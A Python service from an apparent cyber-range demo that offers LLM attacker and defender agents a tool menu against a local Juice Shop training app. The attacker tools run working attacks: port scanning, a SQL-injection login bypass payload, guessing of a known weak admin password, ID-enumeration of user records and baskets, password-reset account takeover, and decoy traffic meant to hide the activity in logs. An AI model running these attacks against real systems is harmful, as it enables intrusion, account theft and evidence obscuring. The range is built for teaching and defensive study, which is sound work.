"""
Constrained attacker/defender action menu for the agentic scenario -- the
"hands" half of the brain/hands split in specs/local-llm-agents.md. Each
endpoint performs one real HTTP action against the target (through `proxy`,
same as scenarios/web-exploit/attacker/attacker.py) or, for defender tools,
mutates this service's own session state -- so a defender action can
genuinely block the attacker's next call, not just narrate blocking it.

Called by the host-side brain loops (../brain/), never directly by an LLM --
a model only ever sees this menu's JSON schema (GET /tools) and picks a name
+ params; this process does the actual work and is the only thing on
cyberrange_net that ever touches the target. See specs/architecture.md's
"Local LLM runtime" section for why the LLM call itself happens on the host.

Stdlib only, matching the rest of this repo's Python.
"""
import calendar
import json
import os
import re
import shutil
import socket
import threading
import time
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

TARGET = os.environ.get("TARGET", "http://proxy:3000")
# Same shared volume the dashboard and proxy write to -- read directly
# rather than over HTTP, since tool-api already has it mounted (see
# docker-compose.yml). Used only by the end-of-run incident report below.
EVENTS_LOG_PATH = os.environ.get("EVENTS_LOG_PATH", "/data/events.jsonl")
ACCESS_LOG_PATH = os.environ.get("ACCESS_LOG_PATH", "/data/access.jsonl")
# The real container, not the demo's own logging proxy -- network-level
# recon targets the actual machine an attacker would resolve/scan in real
# life; the proxy is this demo's own instrumentation, not part of the
# in-fiction target's real infrastructure. Reachable directly because
# tool-api sits on the same cyberrange_net as juice-shop -- see
# specs/architecture.md.
JUICE_SHOP_HOST = os.environ.get("JUICE_SHOP_HOST", "juice-shop")
# Verified live 2026-08-23 against the real container: only 3000 (the app
# itself) is open, everything else genuinely closed -- not a fabricated
# result, and not the point being faked. A real, honest "nothing else here"
# is itself a valid recon finding.
COMMON_PORTS = [21, 22, 23, 25, 80, 443, 3000, 3306, 5432, 6379, 8080, 8443, 9200, 27017]

# Same pattern the real, independent detector uses (scenarios/web-exploit/
# detector/detector.py's FTP_PATH_PATTERN) -- matching it here means
# tool-api's own "was this exposed" call agrees with what the detector will
# actually alert on. Juice Shop's Angular SPA returns 200 for *any*
# unmatched path (client-side routing fallback), so a bare status==200
# check would false-positive on a path the model just made up. Verified
# live 2026-08-22: /ftp/acquisitions.md and /ftp/incident-support.kdbx
# both genuinely serve real file content (not the SPA shell); several
# other /ftp/ candidates (eastere.gg, coupons_2013.md.bak, package.json.bak,
# suspicious_errors.yml) are real files but blocked by Juice Shop's own
# extension filter (403) -- left reachable-but-usually-blocked on purpose,
# so a model guessing them is a real, honest miss, not a fake one.
EXPOSED_PATH_PATTERN = re.compile(r"^/ftp/.+\.(md|pdf|txt|kdbx)$", re.IGNORECASE)

# The one payload verified by hand to work against this app's actual login
# query (see scenarios/web-exploit/attacker/attacker.py). A small model
# reliably *decides* to attempt a SQLi bypass but doesn't reliably craft
# working injection syntax from scratch -- letting it free-text the payload
# was tested and found to fail on close-but-wrong variants (see
# specs/local-llm-agents.md's rehearsal notes), so the mechanics of the
# injection are fixed; the model's choice is whether/when to use it.
SQLI_PAYLOAD = "' OR 1=1--"
EVENTS_API = os.environ.get("EVENTS_API", "http://range-dashboard:8080/events")
PORT = int(os.environ.get("PORT", "9000"))

LOCK = threading.Lock()
SESSION = {
    "token": None,
    "logged_in_as": None,
    "enumerated_emails": [],
    "target_email": None,
    "flagged": False,
    "times_blocked": 0,
    "defender_signals": 0,  # flag_session/escalate_to_soc calls -- gates block_attacker, see tool_block_attacker
    "decoy_requests_sent": 0,  # attacker's own bookkeeping (tool_cover_tracks) -- NOT read by the defender's
                               # incident report, which deliberately doesn't have omniscient access to this
    "acknowledged_alerts": [],
    "tried_paths": {},  # path -> last result summary, so a repeat is fast + informative instead of pointless
    "tried_takeover_emails": {},  # email -> True/False (succeeded), so a retry doesn't re-guess a known-bad target
}


def post_event(**ev):
    ev = {k: v for k, v in ev.items() if v is not None}
    data = json.dumps(ev).encode()
    req = urllib.request.Request(
        EVENTS_API, data=data, headers={"Content-Type": "application/json"}, method="POST"
    )
    try:
        urllib.request.urlopen(req, timeout=5)
    except urllib.error.URLError as e:
        print(f"[warn] could not post event: {e}", flush=True)
    print(f"  >> [{ev.get('actor')}] {ev.get('description')}", flush=True)


def target_http(method, path, body=None, headers=None):
    url = TARGET.rstrip("/") + path
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            raw, status = resp.read(), resp.status
    except urllib.error.HTTPError as e:
        raw, status = e.read(), e.code
    try:
        return status, json.loads(raw.decode())
    except (json.JSONDecodeError, UnicodeDecodeError):
        return status, None


# ---- Attacker tools ("hands") ----
# NOTE on block_attacker: it revokes the current session TOKEN, not a
# blanket "nothing works anymore" flag -- see tool_block_attacker below for
# why. Recon tools (this section) never needed a token in the first place,
# so they're never gated by it.

def tool_resolve_target(params):
    try:
        ip = socket.gethostbyname(JUICE_SHOP_HOST)
    except socket.gaierror as e:
        return {"success": False, "summary": f"DNS resolution failed: {e}"}
    with LOCK:
        SESSION["target_ip"] = ip
    post_event(
        scenario="agentic", actor="attacker", step_id="resolve-target", attack_technique_id="T1590",
        description=f"Resolved the target's real network address: {ip}.",
        reasoning=params.get("reasoning"),
    )
    return {"success": True, "summary": f"Target resolves to {ip}.", "ip": ip}


def tool_port_scan(params):
    ip = SESSION.get("target_ip")
    if not ip:
        try:
            ip = socket.gethostbyname(JUICE_SHOP_HOST)
            with LOCK:
                SESSION["target_ip"] = ip
        except socket.gaierror as e:
            return {"success": False, "summary": f"Could not resolve target: {e}"}

    open_ports = []
    for port in COMMON_PORTS:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        try:
            if s.connect_ex((ip, port)) == 0:
                open_ports.append(port)
        finally:
            s.close()

    post_event(
        scenario="agentic", actor="attacker", step_id="port-scan-result", attack_technique_id="T1046",
        severity="medium" if open_ports else None,
        description=(
            f"Scanned {len(COMMON_PORTS)} common ports on {ip} -- "
            + (f"open: {', '.join(str(p) for p in open_ports)}." if open_ports else "nothing open besides what's already known.")
        ),
        reasoning=params.get("reasoning"),
    )
    return {"success": True, "summary": f"Open ports on {ip}: {open_ports or 'none new'}.", "open_ports": open_ports, "ip": ip}


def tool_recon(params):
    target_http("GET", "/")
    target_http("GET", "/rest/products/search?q=")
    post_event(
        scenario="agentic", actor="attacker", step_id="recon", attack_technique_id="T1595",
        description="Probing the storefront's public surface: home page and product search.",
        reasoning=params.get("reasoning"),
    )
    return {"success": True, "summary": "Recon complete -- ordinary storefront, nothing flagged yet."}


def tool_probe_path(params):
    path = params.get("path") or "/ftp/acquisitions.md"
    if path in SESSION["tried_paths"]:
        return {"success": False, "summary": f"Already checked {path} this run ({SESSION['tried_paths'][path]}) -- try a different path instead of repeating this one."}

    status, _ = target_http("GET", path)
    exposed = status == 200 and bool(EXPOSED_PATH_PATTERN.match(path))
    with LOCK:
        SESSION["tried_paths"][path] = f"HTTP {status}, {'exposed' if exposed else 'nothing there'}"
    if exposed:
        post_event(
            scenario="agentic", actor="attacker", step_id="confidential-file-exposed",
            attack_technique_id="T1213", severity="medium", legal_ref="cfaa-1030a2-misconfig",
            description=f"{path} is served with a plain 200 -- reachable by anyone who requests the exact path, no auth involved.",
            reasoning=params.get("reasoning"),
        )
    elif status == 200:
        # A 200 here almost always means Juice Shop's Angular front end served
        # its own default page for an unmatched route, not a real file -- easy
        # to misread on a dashboard as "found something." Say so explicitly.
        post_event(
            scenario="agentic", actor="attacker", step_id="probe-path-miss", attack_technique_id="T1213",
            description=f"Requested {path} -- got 200, but that's just the app's default page for any unmatched path, not a real file. Nothing here.",
            reasoning=params.get("reasoning"),
        )
    else:
        post_event(
            scenario="agentic", actor="attacker", step_id="probe-path-miss", attack_technique_id="T1213",
            description=f"Requested {path} -- got {status}, nothing there.",
            reasoning=params.get("reasoning"),
        )
    return {"success": exposed, "summary": f"{path} -> HTTP {status}" + (" (default app page, not a real file)" if status == 200 and not exposed else "")}


def tool_sqli_login_bypass(params):
    status, resp = target_http("POST", "/rest/user/login", body={"email": SQLI_PAYLOAD, "password": "irrelevant"})
    success = status == 200 and bool(resp) and "authentication" in resp
    if success:
        token = resp["authentication"]["token"]
        logged_in_as = resp["authentication"].get("umail", "unknown")
        with LOCK:
            SESSION["token"] = token
            SESSION["logged_in_as"] = logged_in_as
        post_event(
            scenario="agentic", actor="attacker", step_id="sqli-login-bypass-success",
            attack_technique_id="T1190", severity="high", legal_ref="cfaa-1030a2",
            description=f"Bypass succeeded -- authenticated as {logged_in_as} with zero valid credentials.",
            reasoning=params.get("reasoning"),
        )
        return {"success": True, "summary": f"Authenticated as {logged_in_as} via SQL-injection login bypass."}
    post_event(
        scenario="agentic", actor="attacker", step_id="sqli-login-bypass-failed",
        attack_technique_id="T1190", severity="medium",
        description=f"Login bypass attempt failed (status {status}).",
        reasoning=params.get("reasoning"),
    )
    return {"success": False, "summary": f"Bypass failed, status {status}."}


# A genuinely different technique from sqli_login_bypass: no injection, just
# a short list of weak/default credentials against the real login endpoint.
# Verified live 2026-08-22 -- admin@juice-sh.op / admin123 is a real, seeded
# weak credential in this app (not invented for the demo); the rest are
# realistic guesses that genuinely fail, same as they would in real life.
COMMON_CREDENTIALS = [
    ("admin@juice-sh.op", "admin123"),
    ("admin@juice-sh.op", "password"),
    ("admin@juice-sh.op", "admin"),
    ("demo@juice-sh.op", "demo"),
]


def tool_guess_common_credentials(params):
    for email, pw in COMMON_CREDENTIALS:
        status, resp = target_http("POST", "/rest/user/login", body={"email": email, "password": pw})
        if status == 200 and resp and "authentication" in resp:
            token = resp["authentication"]["token"]
            logged_in_as = resp["authentication"].get("umail", email)
            with LOCK:
                SESSION["token"] = token
                SESSION["logged_in_as"] = logged_in_as
            post_event(
                scenario="agentic", actor="attacker", step_id="weak-credential-login-success",
                attack_technique_id="T1078", severity="high", legal_ref="cfaa-1030a2",
                description=f"Logged in as {logged_in_as} using a guessed weak/default password ({pw!r}) -- no injection needed, the account just never had a strong password.",
                reasoning=params.get("reasoning"),
            )
            return {"success": True, "summary": f"Logged in as {logged_in_as} with a guessed weak password."}
    post_event(
        scenario="agentic", actor="attacker", step_id="weak-credential-login-failed",
        attack_technique_id="T1078", severity="low",
        description=f"Tried {len(COMMON_CREDENTIALS)} common weak credential pairs -- none worked.",
        reasoning=params.get("reasoning"),
    )
    return {"success": False, "summary": "None of the common weak credentials worked."}


def tool_enumerate_user_records(params):
    token = SESSION.get("token")
    if not token:
        post_event(
            scenario="agentic", actor="attacker", step_id="broken-access-enum-no-session",
            attack_technique_id="T1213",
            description="Tried to enumerate user records, but there's no active session right now.",
            reasoning=params.get("reasoning"),
        )
        return {"success": False, "summary": "No active session -- get one with sqli_login_bypass or guess_common_credentials first."}

    count = max(1, min(int(params.get("count") or 5), 10))
    exposed = []
    for user_id in range(1, count + 1):
        status, resp = target_http("GET", f"/api/Users/{user_id}", headers={"Authorization": f"Bearer {token}"})
        if status == 200 and resp and resp.get("status") == "success":
            exposed.append(resp["data"])
        time.sleep(0.5)  # fast enough to land inside the detector's enumeration window

    emails = [u.get("email") for u in exposed if u.get("email")]
    with LOCK:
        SESSION["enumerated_emails"] = emails
        # jim@juice-sh.op has the guessable security question the account-takeover
        # tool relies on -- prefer it if present, same known-good target as the
        # scripted scenario (scenarios/web-exploit/attacker/attacker.py).
        SESSION["target_email"] = "jim@juice-sh.op" if "jim@juice-sh.op" in emails else (emails[0] if emails else None)

    post_event(
        scenario="agentic", actor="attacker", step_id="broken-access-enum-result",
        attack_technique_id="T1213", severity="critical", legal_ref="co-18-5.5-102",
        description=f"Pulled {len(exposed)} full user records with one bypassed session -- none of which belonged to this session's own account.",
        reasoning=params.get("reasoning"),
    )
    return {"success": True, "summary": f"Enumerated {len(exposed)} user records.", "emails": emails}


def tool_check_other_baskets(params):
    # A different broken-access-control finding from enumerate_user_records:
    # verified live 2026-08-22 -- one session token can read OTHER users'
    # shopping baskets (different UserId per basket) just by guessing
    # sequential basket IDs. Same technique class (IDOR), different endpoint.
    token = SESSION.get("token")
    if not token:
        post_event(
            scenario="agentic", actor="attacker", step_id="basket-idor-no-session",
            attack_technique_id="T1213",
            description="Tried to check other users' baskets, but there's no active session right now.",
            reasoning=params.get("reasoning"),
        )
        return {"success": False, "summary": "No active session -- get one first (sqli_login_bypass or guess_common_credentials)."}

    count = max(1, min(int(params.get("count") or 5), 10))
    others = []
    for basket_id in range(1, count + 1):
        status, resp = target_http("GET", f"/rest/basket/{basket_id}", headers={"Authorization": f"Bearer {token}"})
        if status == 200 and resp:
            data = resp.get("data", {})
            others.append({"basket_id": basket_id, "user_id": data.get("UserId"), "items": len(data.get("Products", []))})
        time.sleep(0.3)

    distinct_owners = {o["user_id"] for o in others if o["user_id"] is not None}
    post_event(
        scenario="agentic", actor="attacker", step_id="basket-idor-result",
        attack_technique_id="T1213", severity="high", legal_ref="co-18-5.5-102",
        description=f"Read {len(others)} shopping baskets belonging to {len(distinct_owners)} different users, using one session token and nothing but sequential basket IDs.",
        reasoning=params.get("reasoning"),
    )
    return {"success": len(others) > 0, "summary": f"Read {len(others)} baskets across {len(distinct_owners)} users.", "baskets": others}


def tool_account_takeover(params):
    # Honor the model's own choice of target when it gives one -- previously
    # this silently ignored whatever the model said and always used the
    # enumerated/jim default, so the model's stated reasoning ("targeting
    # bender@...") and the real action (always jim) could disagree. Only
    # jim@juice-sh.op's security answer is actually known ("Samuel"), so a
    # model-chosen target other than jim will honestly fail here -- that's
    # a real, informative miss, not a bug.
    target_email = params.get("email") or SESSION.get("target_email") or "jim@juice-sh.op"

    if target_email in SESSION["tried_takeover_emails"]:
        already_took_over = SESSION["tried_takeover_emails"][target_email]
        if already_took_over:
            return {"success": True, "summary": f"Already took over {target_email} this run -- no need to repeat it. Try a different enumerated user, or move on."}
        untried = [e for e in SESSION.get("enumerated_emails", []) if e not in SESSION["tried_takeover_emails"]]
        hint = f" Untried so far: {', '.join(untried)}." if untried else " No other enumerated users left untried."
        return {"success": False, "summary": f"Already tried {target_email} and it failed -- don't repeat it.{hint}"}

    status, q = target_http("GET", f"/rest/user/security-question?email={target_email}")
    question_text = (q or {}).get("question", {}).get("question", "unknown")
    post_event(
        scenario="agentic", actor="attacker", step_id="account-takeover-question", attack_technique_id="T1098",
        description=f'Security question for {target_email}: "{question_text}" -- answerable from public trivia.',
        reasoning=params.get("reasoning"),
    )

    new_password = "Cyb3rRange!2026"
    status, resp = target_http(
        "POST", "/rest/user/reset-password",
        body={"email": target_email, "answer": "Samuel", "new": new_password, "repeat": new_password},
    )
    if status == 200 and resp is not None:
        status2, login_resp = target_http("POST", "/rest/user/login", body={"email": target_email, "password": new_password})
        took_over = status2 == 200 and login_resp and "authentication" in login_resp
        with LOCK:
            SESSION["tried_takeover_emails"][target_email] = True
        post_event(
            scenario="agentic", actor="attacker", step_id="account-takeover-success",
            attack_technique_id="T1098", severity="critical", legal_ref="identity-theft-1028",
            description=(
                f"Password reset accepted -- new credentials {'successfully log in' if took_over else 'were set'} "
                f"as {target_email}, full control of a real customer's account."
            ),
            reasoning=params.get("reasoning"),
        )
        return {"success": True, "summary": f"Took over {target_email}."}

    with LOCK:
        SESSION["tried_takeover_emails"][target_email] = False
    untried = [e for e in SESSION.get("enumerated_emails", []) if e not in SESSION["tried_takeover_emails"]]
    hint = f" Other enumerated users worth trying: {', '.join(untried)}." if untried else ""
    post_event(
        scenario="agentic", actor="attacker", step_id="account-takeover-failed",
        attack_technique_id="T1098", severity="medium",
        description=f"Password reset attempt for {target_email} failed (status {status}).",
        reasoning=params.get("reasoning"),
    )
    return {"success": False, "summary": f"Takeover failed for {target_email}, status {status}.{hint}"}


# port_scan already showed nothing but the web app itself is reachable (see
# resolve_target/port_scan above) -- this session never had filesystem or
# host access, so it has no real way to delete or edit the actual log
# files. What it CAN honestly attempt, purely at the HTTP layer: bury the
# real attack traffic in a burst of decoy requests through the same proxy,
# hoping to make a manual reconstruction of the incident less complete.
# This doesn't erase anything already detected -- real detection already
# fired independently, before this ever runs -- see tool_investigate below
# for how the defender's report treats this honestly either way.
DECOY_PATHS = [
    "/", "/rest/products/search?q=", "/rest/products/search?q=widget",
    "/rest/products/search?q=juice", "/robots.txt", "/rest/languages",
    "/rest/products/1/reviews", "/api/Quantitys", "/rest/products/2/reviews",
]


def tool_cover_tracks(params):
    count = 40
    for i in range(count):
        target_http("GET", DECOY_PATHS[i % len(DECOY_PATHS)])
    with LOCK:
        SESSION["decoy_requests_sent"] += count
    post_event(
        scenario="agentic", actor="attacker", step_id="cover-tracks-attempt", attack_technique_id="T1070",
        severity="medium",
        description=(
            f"Sent {count} decoy requests through the same channel to bury real attack traffic in noise. "
            "This session never showed any sign of filesystem or host access (recon found only the web app "
            "listening), so real log deletion was never realistically on the table -- this is what's left to try "
            "instead. It can't erase what's already been detected, but it can make a full reconstruction less complete."
        ),
        reasoning=params.get("reasoning"),
    )
    return {"success": True, "summary": f"Sent {count} decoy requests to muddy the traffic log."}


# ---- Defender tools ("hands") ----
# Same constrained-menu treatment as the attacker, per specs/local-llm-agents.md
# ("Design questions -- resolved 2026-08-22"). The detector
# (scenarios/web-exploit/detector, reused unchanged) already does real,
# independent detection off real traffic -- these tools are what the
# defender can *do* about an alert, not how alerts get raised.

def tool_check_alerts(params):
    try:
        with urllib.request.urlopen(EVENTS_API, timeout=5) as resp:
            data = json.loads(resp.read().decode())
    except (urllib.error.URLError, json.JSONDecodeError):
        return {"success": False, "summary": "Could not reach the event stream."}
    events = data.get("events", [])
    alerts = [e for e in events if e.get("actor") == "defender" and str(e.get("step_id", "")).startswith("detect-")]
    with LOCK:
        seen = set(SESSION["acknowledged_alerts"])
        new_alerts = [a for a in alerts if a.get("step_id") not in seen]
        SESSION["acknowledged_alerts"] = list(seen | {a.get("step_id") for a in new_alerts})
    return {"success": True, "alerts": new_alerts, "summary": f"{len(new_alerts)} new alert(s) since last check."}


def tool_flag_session(params):
    with LOCK:
        SESSION["flagged"] = True
        SESSION["defender_signals"] += 1
    post_event(
        scenario="agentic", actor="defender", step_id="session-flagged", severity="medium",
        description="Flagged the current session as suspicious for follow-up review.",
        reasoning=params.get("reasoning"),
    )
    return {"success": True, "summary": "Session flagged."}


MIN_SIGNALS_BEFORE_BLOCK = 2


def tool_block_attacker(params):
    # Revokes the CURRENT session token, not a permanent kill switch -- a
    # real block on one session/token doesn't patch the underlying
    # vulnerability, so a real attacker just re-authenticates (SQLi and the
    # weak admin credential both still work) and keeps going, informed by
    # what they already found (enumerated users, tried paths, tried
    # takeover targets all persist across this). Blocking still has real
    # teeth: it costs the attacker a turn to recover, and it's a genuine,
    # correctly-modeled defensive action for the dashboard/legal timeline --
    # it just isn't a magic "game over," which wouldn't be an honest lesson
    # about what blocking a session actually accomplishes. See
    # specs/local-llm-agents.md's rehearsal notes, 2026-08-23.
    #
    # Gated on having flagged/escalated at least twice first: rehearsal
    # 2026-08-23 showed a defender model reaching for block_attacker on the
    # very first, lowest-severity alert -- real SOC practice is to build
    # confidence before cutting someone off (an early block also cuts off
    # the chance to observe more of the attack), and it left the attacker
    # with no real room to do anything. This is a code-level guard, not
    # just prompt wording, because prompt-only discipline didn't hold up
    # in practice (the same lesson as ensure_reasoning() in brain/common.py).
    if SESSION["defender_signals"] < MIN_SIGNALS_BEFORE_BLOCK:
        with LOCK:
            SESSION["flagged"] = True
            SESSION["defender_signals"] += 1
        post_event(
            scenario="agentic", actor="defender", step_id="session-flagged", severity="medium",
            description="Flagged the current session -- not enough evidence yet to justify a full block on one alert alone.",
            reasoning=params.get("reasoning"),
        )
        return {"success": True, "summary": "Not enough evidence yet to block -- flagged instead. Keep watching; block once you've seen more."}

    with LOCK:
        SESSION["token"] = None
        SESSION["times_blocked"] += 1
    post_event(
        scenario="agentic", actor="defender", step_id="attacker-blocked", severity="high",
        description="Revoked the attacker's current session -- it'll need a new one to keep going, but the underlying vulnerability isn't fixed by this alone.",
        reasoning=params.get("reasoning"),
    )
    return {"success": True, "summary": "Session token revoked -- get a new one (sqli_login_bypass or guess_common_credentials) to continue."}


def tool_escalate_to_soc(params):
    with LOCK:
        SESSION["defender_signals"] += 1
    post_event(
        scenario="agentic", actor="defender", step_id="escalated-to-soc", severity="medium",
        description="Escalated this incident to a human SOC analyst for follow-up.",
        reasoning=params.get("reasoning"),
    )
    return {"success": True, "summary": "Escalated to a human analyst."}


# ---- End-of-run incident report ----
# Deterministic on purpose, not LLM-improvised: this is presented as
# evidence, and the same "never fabricate a finding or a citation" bar
# CLAUDE.md holds the legal content to applies here. The defender's model
# doesn't write this -- it's built directly from the real event/access
# logs, the same way the legal-overlay panel is built from real events
# joined against legal-map.json, not generated prose.

def _read_jsonl(path):
    if not os.path.exists(path):
        return []
    rows = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                rows.append(json.loads(line))
            except json.JSONDecodeError:
                continue
    return rows


def _max_traffic_burst(access_log_path, window_seconds=5, threshold=30):
    """A real, honest heuristic on the raw log -- the same sliding-window
    style the actual detector already uses for enumeration (see
    scenarios/web-exploit/detector/detector.py's check_enum). Threshold set
    from a real baseline measurement, 2026-08-23: Juice Shop's own
    socket.io connection handshake alone can burst ~17 requests in 5s on a
    normal page load, so 15 false-positived on pure background/presenter
    traffic with zero attack activity. cover_tracks sends 40 in a tight
    loop, comfortably clearing 30 with real margin above that baseline.
    Deliberately
    does NOT read the attacker's own decoy_requests_sent bookkeeping --
    a real investigator wouldn't have that, only the raw log itself."""
    epochs = []
    for entry in _read_jsonl(access_log_path):
        ts = entry.get("ts")
        if not ts:
            continue
        try:
            epochs.append(calendar.timegm(time.strptime(ts, "%Y-%m-%dT%H:%M:%SZ")))
        except ValueError:
            continue
    epochs.sort()
    peak = 0
    i = 0
    for j in range(len(epochs)):
        while epochs[j] - epochs[i] > window_seconds:
            i += 1
        peak = max(peak, j - i + 1)
    return peak if peak >= threshold else 0


def build_incident_report():
    events = _read_jsonl(EVENTS_LOG_PATH)
    confirmed = [e for e in events if e.get("legal_ref")]

    total_requests = len(_read_jsonl(ACCESS_LOG_PATH))
    burst = _max_traffic_burst(ACCESS_LOG_PATH)

    lines = [
        "INCIDENT REPORT",
        f"{len(confirmed)} confirmed finding(s) with a legal citation.",
    ]
    if not confirmed:
        lines.append(
            "No confirmed malicious activity was identified during this session. "
            "This reflects an absence of confirmed findings -- it is not a guarantee "
            "that nothing happened, only that nothing was independently confirmed."
        )
    else:
        for e in confirmed:
            lines.append(f"- [{e.get('attack_technique_id', '?')}] {e.get('description', '')} (statute ref: {e.get('legal_ref')})")

    lines.append("")
    lines.append(
        f"Raw traffic log: {total_requests} real request(s) recorded. This includes normal "
        "application background traffic (e.g. periodic client polling), so raw volume alone "
        "isn't a reliable signal of attack activity on its own."
    )
    if burst:
        lines.append(
            f"NOTE: a burst of {burst} requests landed within a 5-second window -- consistent "
            "with automated/scripted traffic, possibly an attempt to obscure activity in the "
            "log. The findings confirmed above were independently detected before this report "
            "was compiled and are unaffected, but this session's raw traffic should not be "
            "assumed fully reconstructed."
        )
    else:
        lines.append("No unusual traffic bursts were detected in the raw log.")

    return "\n".join(lines), confirmed


def tool_investigate_incident():
    report_text, confirmed = build_incident_report()

    ts = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
    backed_up = []
    for label, src in (("events", EVENTS_LOG_PATH), ("access-log", ACCESS_LOG_PATH)):
        if os.path.exists(src):
            dest = f"/evidence/evidence-agentic-{label}-{ts}.jsonl"
            try:
                shutil.copyfile(src, dest)
                backed_up.append(dest)
            except OSError as e:
                print(f"[warn] could not back up {src}: {e}", flush=True)

    report_text += "\n\n" + (
        "Evidence preserved for trial: " + ", ".join(backed_up)
        if backed_up else
        "No evidence files were available to back up."
    )

    post_event(
        scenario="agentic", actor="defender", step_id="incident-report",
        severity="critical" if confirmed else "low",
        description=report_text,
    )
    return {"success": True, "report": report_text, "confirmed_count": len(confirmed), "backed_up": backed_up}


_REASONING_PARAM = {"type": "string", "description": "One short sentence on why you're taking this action, for the audience watching."}

TOOLS = {
    "resolve_target": {
        "role": "attacker", "handler": tool_resolve_target,
        "description": "Resolve the target's real network address (IP), the way a real engagement starts before touching the application layer at all.",
        "properties": {},
    },
    "port_scan": {
        "role": "attacker", "handler": tool_port_scan,
        "description": "Scan the target machine's common ports (SSH, databases, alternate web ports, etc.) to see what's actually listening beyond the web app. A real scan can honestly come back with nothing extra open -- that's still useful information, not a failure.",
        "properties": {},
    },
    "recon": {
        "role": "attacker", "handler": tool_recon,
        "description": "Passively probe the target's public pages (home page, product search) for anything notable. A safe first move.",
        "properties": {},
    },
    "probe_path": {
        "role": "attacker", "handler": tool_probe_path,
        "description": "Request a specific URL path directly, with no login, to check whether it's exposed with no access control. Guess whatever seems plausible -- backup/staging paths under /ftp/, config files, hidden dirs. Most guesses won't hit anything real, and that's fine -- a miss is a real, honest result, not a failure.",
        "properties": {"path": {"type": "string", "description": "The path to request, e.g. /ftp/acquisitions.md -- try creative or unconventional guesses too."}},
    },
    "sqli_login_bypass": {
        "role": "attacker", "handler": tool_sqli_login_bypass,
        "description": "Send a crafted login request designed to bypass authentication via SQL injection in the email field. One of two ways to get an authenticated session -- see also guess_common_credentials.",
        "properties": {},
    },
    "guess_common_credentials": {
        "role": "attacker", "handler": tool_guess_common_credentials,
        "description": "Try a short list of common weak/default admin credentials against the real login endpoint -- no injection, just guessing. A genuinely different strategy from sqli_login_bypass for getting an authenticated session; worth trying either first.",
        "properties": {},
    },
    "enumerate_user_records": {
        "role": "attacker", "handler": tool_enumerate_user_records,
        "description": "Using an active authenticated session, pull other users' account records by guessing sequential IDs.",
        "properties": {"count": {"type": "integer", "description": "How many sequential user IDs to try (max 10)."}},
    },
    "check_other_baskets": {
        "role": "attacker", "handler": tool_check_other_baskets,
        "description": "Using an active authenticated session, read other users' shopping baskets by guessing sequential basket IDs -- a different broken-access-control finding from enumerate_user_records, worth trying too.",
        "properties": {"count": {"type": "integer", "description": "How many sequential basket IDs to try (max 10)."}},
    },
    "account_takeover": {
        "role": "attacker", "handler": tool_account_takeover,
        "description": "Attempt a full account takeover on a specific user via their password-reset security question. Your email choice actually decides the target -- pick whichever enumerated user seems most promising, or leave it out to use the most promising one seen so far. Only some users' security questions turn out to be guessable -- a wrong guess is a real, honest miss.",
        "properties": {"email": {"type": "string", "description": "Which user's account to target, e.g. jim@juice-sh.op -- pick from users you've already enumerated."}},
    },
    "cover_tracks": {
        "role": "attacker", "handler": tool_cover_tracks,
        "description": "Send a burst of decoy requests through the same channel to bury the real attack traffic in noise, making a full investigation harder. This session never showed signs of filesystem/host access, so real log deletion isn't realistically available -- this is the honest alternative. Worth considering once you've accomplished your main goals, or if you suspect you're being watched.",
        "properties": {},
    },
    "check_alerts": {
        "role": "defender", "handler": tool_check_alerts,
        "description": "Check for new detection alerts fired by the independent traffic detector since you last checked.",
        "properties": {},
    },
    "flag_session": {
        "role": "defender", "handler": tool_flag_session,
        "description": "Flag the current session as suspicious for follow-up review, without cutting off its access yet.",
        "properties": {},
    },
    "block_attacker": {
        "role": "defender", "handler": tool_block_attacker,
        "description": "Revoke the attacker's current session. It costs them a turn to re-authenticate, but doesn't fix the underlying vulnerability, so a determined attacker will likely come back. Requires having already flagged or escalated at least twice -- calling this too early just flags instead. Save it for once you've built real confidence, not on the very first alert.",
        "properties": {},
    },
    "escalate_to_soc": {
        "role": "defender", "handler": tool_escalate_to_soc,
        "description": "Escalate this incident to a human SOC analyst instead of, or in addition to, taking automated action.",
        "properties": {},
    },
}

for _name, _tool in TOOLS.items():
    _props = dict(_tool["properties"])
    _props["reasoning"] = _REASONING_PARAM
    _tool["schema"] = {
        "type": "function",
        "function": {
            "name": _name,
            "description": _tool["description"],
            "parameters": {
                "type": "object",
                "properties": _props,
                "required": list(_tool["properties"].keys()) + ["reasoning"],
            },
        },
    }


class Handler(BaseHTTPRequestHandler):
    def _send_json(self, obj, status=200):
        body = json.dumps(obj).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.path == "/health":
            self._send_json({"ok": True})
        elif self.path.startswith("/tools"):
            role = None
            if "?" in self.path:
                query = self.path.split("?", 1)[1]
                params = dict(p.split("=", 1) for p in query.split("&") if "=" in p)
                role = params.get("role")
            schemas = [t["schema"] for t in TOOLS.values() if role in (None, t["role"])]
            self._send_json({"tools": schemas})
        elif self.path == "/session":
            self._send_json(dict(SESSION))
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == "/reset":
            with LOCK:
                SESSION.update({
                    "token": None, "logged_in_as": None, "enumerated_emails": [],
                    "target_email": None, "flagged": False, "times_blocked": 0,
                    "defender_signals": 0, "decoy_requests_sent": 0, "acknowledged_alerts": [],
                    "tried_paths": {}, "tried_takeover_emails": {},
                })
            self._send_json({"ok": True})
            return
        if self.path == "/investigate":
            # Not under /tools/ on purpose -- this isn't part of the LLM's
            # choosable menu (see build_incident_report's docstring for
            # why); it's a guaranteed final step the defender brain loop
            # calls directly once the engagement is over.
            try:
                result = tool_investigate_incident()
            except Exception as e:
                print(f"[error] investigate_incident raised: {e}", flush=True)
                result = {"success": False, "summary": f"Investigation failed: {e}"}
            self._send_json(result)
            return
        if not self.path.startswith("/tools/"):
            self.send_response(404)
            self.end_headers()
            return
        name = self.path[len("/tools/"):]
        tool = TOOLS.get(name)
        if not tool:
            self._send_json({"error": f"unknown tool '{name}'"}, 404)
            return
        length = int(self.headers.get("Content-Length", 0) or 0)
        raw = self.rfile.read(length) if length else b""
        try:
